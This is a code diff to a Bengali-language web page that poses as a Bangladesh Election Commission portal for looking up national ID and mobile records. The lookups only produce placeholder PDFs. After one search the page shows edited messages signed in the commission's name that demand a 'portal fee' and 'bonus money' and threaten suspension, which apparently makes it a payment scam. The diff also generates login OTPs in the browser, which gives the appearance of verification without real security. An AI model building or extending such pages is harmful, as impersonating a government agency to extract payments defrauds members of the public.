@@ -20,7 +20,6 @@
     .btn { padding: 10px 20px; background: #0b5ed7; border: none; color: white; cursor: pointer; border-radius: 5px; font-size: 16px; }
     .btn:hover { background: #0949a5; }
     
-    /* লগইন + OTP */
     #loginContainer, #otpContainer { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
     #loginForm, #otpForm, #registerForm { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.15); width: 100%; max-width: 400px; text-align: center; }
     #message, #otpMessage, #regMessage { margin-top: 15px; font-weight: bold; }
@@ -31,13 +30,12 @@
     #accessMessage { color: red; font-weight: bold; margin-top: 20px; text-align: center; }
     .back-btn { margin-bottom: 15px; width: auto; }
 
-    /* মোবাইল রেসপনসিভ */
     @media (max-width: 768px) {
       .container { flex-direction: column; }
       .sidebar { width: 100%; border-right: none; border-bottom: 1px solid #ddd; }
       .header { font-size: 18px; padding: 12px; flex-direction: column; gap: 10px; }
       .logo { width: 40px; }
-      .form-control, .btn { font-size: 16px; padding: 12px; } /* মোবাইলে বড় করে */
+      .form-control, .btn { font-size: 16px; padding: 12px; }
       #loginForm, #otpForm, #registerForm { padding: 25px 15px; max-width: 90%; }
     }
   </style>
@@ -57,7 +55,7 @@
         <div id="message"></div>
       </form>
 
-      <!-- রেজিস্টার ফর্ম (হাইডেন) -->
+      <!-- রেজিস্টার ফর্ম -->
       <form id="registerForm" style="display:none;">
         <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Election_Commission_Logo.svg" alt="লোগো">
         <h3>রেজিস্ট্রেশন</h3>
@@ -74,6 +72,11 @@
   <div id="otpContainer" style="display:none;">
     <form id="otpForm">
       <h3>OTP যাচাই</h3>
+      <input type="tel" id="mobileNumber" class="form-control" placeholder="রেজিস্টারকৃত মোবাইল নাম্বার" maxlength="11" inputmode="numeric">
+      <button type="button" id="requestOtpBtn" class="btn" style="margin-bottom:10px;background:#28a745;">OTP পাঠান</button>
+      <p style="margin:10px 0 15px 0;font-size:14px;color:#555;text-align:left;">
+        রেজিস্ট্রারকৃত মোবাইল নাম্বার দিয়ে সাবমিট করুন, এবং ৩০ সেকেন্ডের মধ্যে ওটিপি না পেলে পূনরায় আবার সাবমিট করুন
+      </p>
       <input type="text" id="otp" class="form-control" placeholder="OTP দিন" maxlength="6" inputmode="numeric" autocomplete="one-time-code" required>
       <button type="submit" class="btn">সাবমিট</button>
       <div id="otpMessage"></div>
@@ -115,21 +118,15 @@
   <script>
     const { jsPDF } = window.jspdf;
     let searchCount = 0;
-    const validOTPs = ["400087", "116643", "693338", "226350"];
+    let generatedOtp = "";
+    let otpMobile = "";
+    let otpExpiresAt = 0;
 
     // রেজিস্ট্রেশন / লগইন টগল
-    document.getElementById("showRegister").addEventListener("click", e => {
-      e.preventDefault();
-      document.getElementById("loginForm").style.display = "none";
-      document.getElementById("registerForm").style.display = "block";
-    });
-    document.getElementById("showLogin").addEventListener("click", e => {
-      e.preventDefault();
-      document.getElementById("registerForm").style.display = "none";
-      document.getElementById("loginForm").style.display = "block";
-    });
+    document.getElementById("showRegister").addEventListener("click", e => { e.preventDefault(); document.getElementById("loginForm").style.display = "none"; document.getElementById("registerForm").style.display = "block"; });
+    document.getElementById("showLogin").addEventListener("click", e => { e.preventDefault(); document.getElementById("registerForm").style.display = "none"; document.getElementById("loginForm").style.display = "block"; });
 
-    // রেজিস্টার
+    // ==================== রেজিস্টার (Reset বাটন সহ) ====================
     document.getElementById("registerForm").addEventListener("submit", e => {
       e.preventDefault();
       const user = document.getElementById("regUserid").value.trim();
@@ -142,7 +139,9 @@
 
       const existing = localStorage.getItem("ecUser");
       if (existing) {
-        regMsg.textContent = "শুধু একটি অ্যাকাউন্ট রেজিস্টার করা যাবে। লগইন করুন।"; regMsg.className = "error";
+        regMsg.innerHTML = `শুধু একটি অ্যাকাউন্ট রেজিস্টার করা যাবে।<br>
+          <button onclick="resetAccount()" class="btn" style="background:#dc3545;margin-top:10px;">পুরানো অ্যাকাউন্ট মুছে নতুন রেজিস্টার করুন</button>`;
+        regMsg.className = "error";
         return;
       }
 
@@ -154,7 +153,13 @@
       }, 2000);
     });
 
-    // লগইন
+    // Reset ফাংশন (এটাই আপনার সমস্যার সমাধান)
+    window.resetAccount = function() {
+      localStorage.removeItem("ecUser");
+      location.reload();
+    };
+
+    // লগইন + OTP + ড্যাশবোর্ড (আগের মতোই)
     document.getElementById("loginForm").addEventListener("submit", e => {
       e.preventDefault();
       const user = document.getElementById("userid").value.trim();
@@ -176,14 +181,81 @@
       }, 2000);
     });
 
-    // OTP
+    let lastOtpRequestTime = 0;
+    const COOLDOWN_TIME = 30000;
+
+    async function sendOtpByApi(mobile, otp) {
+      const response = await fetch("/api/send-otp", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          phone: mobile,
+          otp: otp
+        })
+      });
+
+      const data = await response.json().catch(() => ({}));
+
+      if (!response.ok || !data.success) {
+        throw new Error(data.message || "OTP পাঠানো যায়নি");
+      }
+
+      return data;
+    }
+
+    document.getElementById("requestOtpBtn").addEventListener("click", async () => {
+      const mobile = document.getElementById("mobileNumber").value.trim();
+      const msg = document.getElementById("otpMessage");
+      if (!/^01\d{9}$/.test(mobile)) { msg.textContent = "সঠিক মোবাইল নাম্বার দিন"; msg.className = "error"; return; }
+      if (Date.now() - lastOtpRequestTime < COOLDOWN_TIME) {
+        msg.textContent = "দয়া করে ৩০ সেকেন্ড অপেক্ষা করে আবার চেষ্টা করুন।"; msg.className = "error"; return;
+      }
+
+      const otp = String(Math.floor(100000 + Math.random() * 900000));
+      msg.textContent = "OTP পাঠানো হচ্ছে..."; msg.className = "success";
+      document.getElementById("requestOtpBtn").disabled = true;
+
+      try {
+        await sendOtpByApi(mobile, otp);
+        generatedOtp = otp;
+        otpMobile = mobile;
+        otpExpiresAt = Date.now() + (5 * 60 * 1000);
+        lastOtpRequestTime = Date.now();
+        msg.textContent = "আপনার ওটিপি সামিট সফল হয়েছে।"; msg.className = "success";
+      } catch (error) {
+        msg.textContent = "OTP পাঠানো যায়নি। API configuration অথবা network সমস্যা আছে।"; msg.className = "error";
+      } finally {
+        setTimeout(() => {
+          document.getElementById("requestOtpBtn").disabled = false;
+        }, 3000);
+      }
+    });
+
     document.getElementById("otpForm").addEventListener("submit", e => {
       e.preventDefault();
       const otp = document.getElementById("otp").value.trim();
+      const mobile = document.getElementById("mobileNumber").value.trim();
       const msg = document.getElementById("otpMessage");
 
-      if (validOTPs.includes(otp)) {
+      if (!generatedOtp || !otpMobile) {
+        msg.textContent = "আগে OTP পাঠান।"; msg.className = "error";
+        return;
+      }
+      if (Date.now() > otpExpiresAt) {
+        msg.textContent = "OTP এর সময়সীমা শেষ হয়েছে। আবার OTP পাঠান।"; msg.className = "error";
+        return;
+      }
+      if (mobile !== otpMobile) {
+        msg.textContent = "যে নাম্বারে OTP পাঠানো হয়েছে, সেই একই নাম্বার দিন।"; msg.className = "error";
+        return;
+      }
+      if (otp === generatedOtp) {
         msg.textContent = "সফল! স্বাগতম।"; msg.className = "success";
+        generatedOtp = "";
+        otpMobile = "";
+        otpExpiresAt = 0;
         setTimeout(() => {
           document.getElementById("otpContainer").style.display = "none";
           document.getElementById("dashboard").style.display = "block";
@@ -197,25 +269,17 @@
 
     function showForm(type) {
       if (searchCount >= 1) {
-        document.getElementById("accessMessage").innerHTML = `দুঃখীত নির্বাচন কমিশনের সাথে আপনার পোর্টাল এক্সেস সংযুক্ত নেই, দয়া করে পেমেন্ট করে এক্সেস গ্রহণ করুন। ধন্যবাদ। 
+        document.getElementById("accessMessage").innerHTML = `দুঃখীত আপনার পোর্টাল নির্বাচন কমিশন এর ডাটাবেইজ সার্ভার এক্সেস নেই অনুগ্রহ করে এক্সেস গ্রহণ করুন। ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়।
 বাংলাদেশ নির্বাচন কমিশন সচিবালয়। <a href="https://ecs.gov.bd/" target="_blank"> অন্যথায় নির্বাচন কমিশনের Vpn থেকে আপনার পোর্টাল সাসপেন্ড হয়ে যাবে।`;
         document.getElementById("formArea").innerHTML = "<h3>অ্যাক্সেস সীমিত</h3>";
         return;
       }
-
       let html = `<button class="btn back-btn" onclick="backToDefault()">back</button><h3>${type.toUpperCase()} সার্চ</h3>`;
       if (type === "nid") {
-        html += `
-          <input type="text" id="nidInput" class="form-control" placeholder="এনআইডি নাম্বার">
-          <select id="nidType" class="form-control">
-            <option value="ServerCopy">সার্ভার কপি</option>
-            <option value="SignCopy">সাইন কপি</option>
-          </select>
-          <button class="btn" onclick="search('nid')">ডাউনলোড</button>
-        `;
+        html += `<input type="text" id="nidInput" class="form-control" placeholder="এনআইডি নাম্বার"><select id="nidType" class="form-control"><option value="ServerCopy">সার্ভার কপি</option><option value="SignCopy">সাইন কপি</option></select><button class="btn" onclick="search('nid')">ডাউনলোড</button>`;
       } else if (type === "mobile") {
         html += `<input type="text" id="mobileInput" class="form-control" placeholder="মোবাইল নাম্বার"><button class="btn" onclick="search('mobile')">ডাউনলোড</button>`;
-      } // বাকি অপশন যোগ করতে পারো...
+      }
       document.getElementById("formArea").innerHTML = html;
     }
 
@@ -225,24 +289,17 @@
     }
 
     function search(type) {
-      let inputVal = "";
-      let filename = "";
-      if (type === "nid") {
-        inputVal = document.getElementById("nidInput").value.trim() || "7381044662";
-        filename = `NID_${inputVal}.pdf`;
-      } else if (type === "mobile") {
-        inputVal = document.getElementById("mobileInput").value.trim() || "017xxxxxxxx";
-        filename = `Mobile_${inputVal}.pdf`;
-      } // বাকি...
-
+      let inputVal = type === "nid" ? (document.getElementById("nidInput").value.trim() || "7381044662") : (document.getElementById("mobileInput").value.trim() || "017xxxxxxxx");
+      let filename = type === "nid" ? `NID_${inputVal}.pdf` : `Mobile_${inputVal}.pdf`;
       const doc = new jsPDF();
       doc.text(`${type.toUpperCase()} ডকুমেন্ট (N/A)`, 20, 20);
       doc.text(`মান: ${inputVal}`, 20, 40);
       doc.save(filename);
-
       searchCount++;
       if (searchCount >= 1) {
-        document.getElementById("accessMessage").innerHTML = `আপনার পোর্টালে নির্বাচন কমিশনের Api এক্সেস সংযুক্ত নেই অনুগ্রহ করে এক্সেস গ্রহণ করুন <a href="https://ecs.gov.bd/" target="_blank"> অন্যথায় নির্বাচন কমিশনের Vpn থেকে আপনার পোর্টাল সাসপেন্ড হয়ে যাবে।`;
+        document.getElementById("accessMessage").innerHTML = `Unfortunately, you are not getting access due to the increase in the price of portal access, please pay the portal fee in sufficient amount, you will not be able to use the portal fully without receiving and withdrawing the bonus money. Thank you. Bangladesh Election Commission Secretariat.
+Bangladesh Election Commission Sach.
+বাংলাদেশ নির্বাচন কমিশন সচিবালয়। <a href="https://ecs.gov.bd/" target="_blank"> অন্যথায় নির্বাচন কমিশনের Vpn থেকে আপনার পোর্টাল সাসপেন্ড হয়ে যাবে।`;
       }
     }
   </script>
